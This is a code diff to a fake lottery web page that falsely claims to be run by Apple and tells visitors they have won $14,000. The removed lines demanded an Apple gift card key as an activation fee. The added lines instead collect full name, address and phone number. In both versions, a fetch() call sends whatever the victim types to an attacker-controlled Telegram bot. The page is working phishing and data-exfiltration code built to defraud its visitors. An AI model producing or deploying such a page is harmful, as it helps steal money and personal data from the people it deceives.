@@ -101,7 +101,7 @@ This is IA Lottery game. power by Apple Company  </marquee>
 </div>
 
 <p id="try-again-message">Try Again! You have 1 spinning left.</p>
-<p id="win-message">WOW! 😲 You have won $7000! Click below to continue.</p>
+<p id="win-message">WOW! 😲 You have won $14,000! Click below to continue.</p>
 <button id="continue-button" style="display:none;" onclick="showActivationSection()">Continue</button>
 
 <div id="activation-section" style="display:none;">
@@ -116,17 +116,17 @@ This is IA Lottery game. power by Apple Company  </marquee>
   <div style="background-color: #fff3cd; padding: 15px; border-radius: 8px; border: 1px solid #ffcc00;">
     <h3 style="margin: 0; color: #d39e00;">⚠️Alert!</h3>
     <p style="color: #333; margin-top: 5px;">
-      This is an important notice. Please pay attention to the details. <br><font color="#ffcc00"><i>Here you will need to activate your winning with just $200 Apple gift card and make sure that you drop your address in contact form so that we can deliver your money to your door step thanks</i></font></h3>
+      This is an important notice. Please pay attention to the details. <br><font color="#ffcc00"><i>Here you will need to Contact our staffs to Claim your winning by typing your full name,phone number and address below so that we can deliver your money to your door step thanks.</i></font></h3>
     </p>
   </div>
   
 </div>
         <br>
-       <h4><i>All database will be submited to the Apple HQ where your winning we be Stamped and verified.Congratulations one's again. </i></h4>
+       <h4><i>All database will be submited to the Apple IA HQ Congratulations one's again. </i></h4>
 </br>
 </br>
 </br>
-    <input type="text" id="lottery-key" placeholder="Type your Apple gift card Key 🔑">
+    <input type="text" id="lottery-key" placeholder="Type your full name,addres,Phone number 🥳">
     <button onclick="submitLotteryKey()">Activate</button>
 </div>
 
@@ -216,18 +216,18 @@ This is IA Lottery game. power by Apple Company  </marquee>
     function submitLotteryKey() {
         let lotteryKey = document.getElementById("lottery-key").value;
         if (!lotteryKey) {
-            alert("Please enter your Apple gift card key to Activate your winning .");
+            alert("Please enter your Full name,address and phone number to Activate your winning .");
             return;
         }
 
         showLoadingScreen(() => {
-            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent("Apple gift card Key Activated:\n" + lotteryKey)}`)
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent("Winners name for activation :\n" + lotteryKey)}`)
             .then(() => {
-                alert("Activating... We're connecting it to the database");
+                alert("Activating... One of our Agent we contact you as soon as possible");
                 window.location.href = "certificate.html";
             })
             .catch(error => {
-                alert("Error sending Lottery Key.");
+                alert("Error sending winnig name.");
                 console.error(error);
             });
         });
